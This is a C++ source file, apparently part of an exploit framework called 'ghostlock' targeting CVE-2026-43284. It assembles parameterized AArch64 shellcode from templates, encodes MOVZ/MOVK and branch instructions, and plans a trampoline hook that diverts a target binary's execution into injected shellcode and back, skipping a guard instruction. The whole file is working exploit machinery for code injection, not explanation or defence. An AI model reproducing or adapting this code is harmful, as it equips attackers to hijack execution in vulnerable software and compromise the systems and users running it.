/* CVE-2026-43284 parameterized shellcode and trampoline plan (B5-5) --
 * implementation. Pure computation: no allocation, syscall or write. */

#include "backend/cve_2026_43284/steps/shellcode.hpp"

#include <cstddef>
#include <cstdint>
#include <cstring>

namespace ghostlock::backend::cve_2026_43284::steps {
    namespace {
        constexpr std::uint64_t kImmediateMask16 = 0xFFFFU;
        constexpr std::uint32_t kBranchImmBits = 26U;
        constexpr std::int64_t kBranchWordLimit = static_cast<std::int64_t>(1U) << 25U;

        void store_u32(std::uint8_t *p, std::uint32_t value) noexcept {
            p[0] = static_cast<std::uint8_t>(value & 0xFFU);
            p[1] = static_cast<std::uint8_t>((value >> 8U) & 0xFFU);
            p[2] = static_cast<std::uint8_t>((value >> 16U) & 0xFFU);
            p[3] = static_cast<std::uint8_t>((value >> 24U) & 0xFFU);
        }

        void store_u64(std::uint8_t *p, std::uint64_t value) noexcept {
            store_u32(p, static_cast<std::uint32_t>(value & 0xFFFFFFFFU));
            store_u32(p + 4U, static_cast<std::uint32_t>(value >> 32U));
        }

        std::uint64_t slot_end(const ShellcodeSlotSpec &slot) noexcept {
            return static_cast<std::uint64_t>(slot.offset) + slot.size;
        }

        /* Template-shape validation independent of the bindings. */
        bool validate_slots(const ShellcodeTemplate &tmpl, ShellcodeError &error) noexcept {
            if (tmpl.slot_count == 0U) {
                return true;
            }
            if (tmpl.slots == nullptr) {
                error = ShellcodeError::NullSlotTable;
                return false;
            }
            if (tmpl.slot_count > kShellcodeMaxSlots) {
                error = ShellcodeError::TooManySlots;
                return false;
            }
            for (std::size_t i = 0U; i < tmpl.slot_count; ++i) {
                const ShellcodeSlotSpec &slot = tmpl.slots[i];
                if (slot.size == 0U) {
                    error = ShellcodeError::SlotBadSize;
                    return false;
                }
                switch (slot.kind) {
                case ShellcodeSlotKind::Immediate32:
                case ShellcodeSlotKind::Instruction:
                    if (slot.size != 4U) {
                        error = ShellcodeError::SlotBadSize;
                        return false;
                    }
                    if (slot.offset % 4U != 0U) {
                        error = ShellcodeError::SlotMisaligned;
                        return false;
                    }
                    break;
                case ShellcodeSlotKind::Immediate64:
                    if (slot.size != 8U) {
                        error = ShellcodeError::SlotBadSize;
                        return false;
                    }
                    if (slot.offset % 8U != 0U) {
                        error = ShellcodeError::SlotMisaligned;
                        return false;
                    }
                    break;
                case ShellcodeSlotKind::ByteString:
                default:
                    break;
                }
                if (slot_end(slot) > tmpl.size) {
                    error = ShellcodeError::SlotOutOfBounds;
                    return false;
                }
                for (std::size_t j = 0U; j < i; ++j) {
                    const ShellcodeSlotSpec &other = tmpl.slots[j];
                    if (static_cast<std::uint64_t>(slot.offset) < slot_end(other) &&
                        static_cast<std::uint64_t>(other.offset) < slot_end(slot)) {
                        error = ShellcodeError::SlotOverlap;
                        return false;
                    }
                }
            }
            return true;
        }
    } // namespace

    bool encode_mov_imm64(std::uint64_t value, std::uint8_t reg,
                          std::uint32_t out[4]) noexcept {
        if (reg > 31U) {
            return false;
        }
        const std::uint32_t rd = reg;
        out[0] = 0xD2800000U |
                 (static_cast<std::uint32_t>(value & kImmediateMask16) << 5U) | rd;
        out[1] = 0xF2A00000U |
                 (static_cast<std::uint32_t>((value >> 16U) & kImmediateMask16) << 5U) | rd;
        out[2] = 0xF2C00000U |
                 (static_cast<std::uint32_t>((value >> 32U) & kImmediateMask16) << 5U) | rd;
        out[3] = 0xF2E00000U |
                 (static_cast<std::uint32_t>((value >> 48U) & kImmediateMask16) << 5U) | rd;
        return true;
    }

    bool encode_branch(std::uint64_t from, std::uint64_t to, std::uint32_t &out) noexcept {
        if (((from | to) & 0x3U) != 0U) {
            return false;
        }
        const std::int64_t delta = static_cast<std::int64_t>(to - from);
        if ((delta & 0x3) != 0) {
            return false;
        }
        const std::int64_t words = delta / 4;
        if (words < -kBranchWordLimit || words >= kBranchWordLimit) {
            return false;
        }
        out = kAarch64BranchOpcode |
              (static_cast<std::uint32_t>(words) & ((1U << kBranchImmBits) - 1U));
        return true;
    }

    bool build_shellcode(const ShellcodeTemplate &tmpl, const ShellcodeBinding *bindings,
                         std::size_t binding_count, std::uint8_t *out,
                         std::size_t out_capacity, std::size_t &out_size,
                         ShellcodeError &error) noexcept {
        out_size = 0U;
        error = ShellcodeError::None;
        if (tmpl.bytes == nullptr) {
            error = ShellcodeError::NullTemplate;
            return false;
        }
        if (tmpl.size == 0U || tmpl.size % 4U != 0U) {
            error = ShellcodeError::InvalidTemplateSize;
            return false;
        }
        if (tmpl.size > kShellcodeMaxBytes) {
            error = ShellcodeError::TooLarge;
            return false;
        }
        if (!validate_slots(tmpl, error)) {
            return false;
        }
        if (binding_count > 0U && bindings == nullptr) {
            error = ShellcodeError::NullSlotTable;
            return false;
        }
        if (out == nullptr) {
            error = ShellcodeError::NullOutput;
            return false;
        }
        const std::size_t padded =
                (tmpl.size + kShellcodeAlign - 1U) & ~(kShellcodeAlign - 1U);
        if (out_capacity < padded) {
            error = ShellcodeError::OutputTooSmall;
            return false;
        }
        std::memcpy(out, tmpl.bytes, tmpl.size);
        std::memset(out + tmpl.size, 0, padded - tmpl.size);

        std::uint32_t seen = 0U;
        for (std::size_t b = 0U; b < binding_count; ++b) {
            const ShellcodeBinding &binding = bindings[b];
            if (binding.slot_index >= tmpl.slot_count) {
                error = ShellcodeError::UnknownSlot;
                return false;
            }
            const std::uint32_t bit =
                    static_cast<std::uint32_t>(1U) << static_cast<unsigned>(binding.slot_index);
            if ((seen & bit) != 0U) {
                error = ShellcodeError::DuplicateSlot;
                return false;
            }
            seen |= bit;
            const ShellcodeSlotSpec &slot = tmpl.slots[binding.slot_index];
            std::uint8_t *target = out + slot.offset;
            switch (slot.kind) {
            case ShellcodeSlotKind::Immediate32:
                if (binding.immediate > 0xFFFFFFFFU) {
                    error = ShellcodeError::ValueTooLong;
                    return false;
                }
                store_u32(target, static_cast<std::uint32_t>(binding.immediate));
                break;
            case ShellcodeSlotKind::Instruction:
                store_u32(target, static_cast<std::uint32_t>(binding.immediate));
                break;
            case ShellcodeSlotKind::Immediate64:
                store_u64(target, binding.immediate);
                break;
            case ShellcodeSlotKind::ByteString:
                if (binding.bytes.size() >= slot.size) {
                    error = ShellcodeError::ValueTooLong;
                    return false;
                }
                std::memset(target, 0, slot.size);
                if (!binding.bytes.empty()) {
                    std::memcpy(target, binding.bytes.data(), binding.bytes.size());
                }
                break;
            default:
                error = ShellcodeError::BadSlotKind;
                return false;
            }
        }
        out_size = padded;
        return true;
    }

    bool build_hook_plan(const HookTarget &target, std::size_t shellcode_bytes, HookPlan &out,
                         HookPlanError &error, std::size_t entry_offset,
                         std::size_t jump_back_offset) noexcept {
        out = HookPlan{};
        error = HookPlanError::None;
        if (!target.valid) {
            error = HookPlanError::InvalidTarget;
            return false;
        }
        if (shellcode_bytes < 8U) {
            error = HookPlanError::ShellcodeTooSmall;
            return false;
        }
        if (shellcode_bytes % 4U != 0U) {
            error = HookPlanError::ShellcodeMisaligned;
            return false;
        }
        const std::size_t padded =
                (shellcode_bytes + kShellcodeAlign - 1U) & ~(kShellcodeAlign - 1U);
        if (padded > target.payload_max_bytes) {
            error = HookPlanError::PayloadNotMapped;
            return false;
        }
        /* The entry the hook branch targets must be a full aligned word inside
         * the shellcode body. */
        if ((entry_offset % 4U) != 0U || entry_offset + 4U > shellcode_bytes) {
            error = HookPlanError::EntryOutOfRange;
            return false;
        }
        /* The jump-back word goes either at the caller-named offset (the raw
         * blob's own last word, e.g. libcxx.S) or, by default, at the last word
         * of the padded image. */
        const std::size_t jump_at = jump_back_offset == kShellcodeAutoJumpBack
                                            ? padded - 4U
                                            : jump_back_offset;
        if ((jump_at % 4U) != 0U || jump_at + 4U > padded) {
            error = HookPlanError::JumpBackOutOfRange;
            return false;
        }
        std::uint32_t branch = 0U;
        if (!encode_branch(target.hook_vaddr, target.payload_vaddr + entry_offset,
                           branch)) {
            error = HookPlanError::BranchOutOfRange;
            return false;
        }
        std::uint32_t jump_back = 0U;
        if (!encode_branch(target.payload_vaddr + jump_at, target.hook_vaddr + 4U,
                           jump_back)) {
            error = HookPlanError::BranchOutOfRange;
            return false;
        }
        out.valid = true;
        out.hook_file_offset = target.hook_file_offset;
        out.hook_vaddr = target.hook_vaddr;
        out.shellcode_file_offset = target.payload_file_offset;
        out.shellcode_vaddr = target.payload_vaddr;
        out.shellcode_bytes = padded;
        out.branch_instruction = branch;
        out.jump_back_instruction = jump_back;
        out.displaced_instruction = target.displaced_instruction;
        out.guard_skipped = target.guard_skipped;
        out.guard_instruction = target.guard_instruction;
        out.entry_offset = entry_offset;
        out.jump_back_offset = jump_at;
        out.payload_max_bytes = target.payload_max_bytes;
        return true;
    }

} // namespace ghostlock::backend::cve_2026_43284::steps
